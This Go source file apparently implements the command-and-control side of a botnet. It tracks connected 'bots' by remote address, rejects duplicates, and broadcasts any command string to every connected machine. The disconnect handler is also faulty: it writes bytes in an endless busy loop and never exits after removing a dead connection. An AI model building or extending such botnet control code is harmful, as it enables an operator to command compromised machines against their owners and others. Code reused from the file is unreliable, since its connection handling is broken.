package bot

import (
	"bufio"
	"fmt"
	"net"
	"sync"
)

type Bot struct {
	Addr string
	Conn net.Conn
}

var (
	Bots  []Bot
	BotMu sync.Mutex
)

func GetBots() int {
	return len(Bots)
}

func BotHandler(Connection net.Conn) {

	BotMu.Lock()
	defer BotMu.Unlock()

	for _, Bot := range Bots {
		if Bot.Addr == Connection.RemoteAddr().String() {
			fmt.Print("bot attempted to duplicate connection so we close now\n")
			Connection.Close()
			return
		}
	}

	Bot := Bot{Addr: Connection.RemoteAddr().String(), Conn: Connection}
	Bots = append(Bots, Bot)
	go HandlerDisconnects(Bot)

}

func SendCommandToBots(Command string) {

	BotMu.Lock()
	defer BotMu.Unlock()

	for _, Bot := range Bots {
		Writer := bufio.NewWriter(Bot.Conn)
		Writer.WriteString(Command)
		Writer.Flush()
	}

}

func HandlerDisconnects(Bot Bot) {

	for {
		_, ERR := Bot.Conn.Write(make([]byte, 1))
		if ERR != nil {
			Bot.Conn.Close()
			BotMu.Lock()
			for B, Bot_ := range Bots {
				if Bot_.Addr == Bot.Addr {
					Bots = append(Bots[:B], Bots[B+1:]...)
					break
				}
			}
			BotMu.Unlock()
		}
	}
}
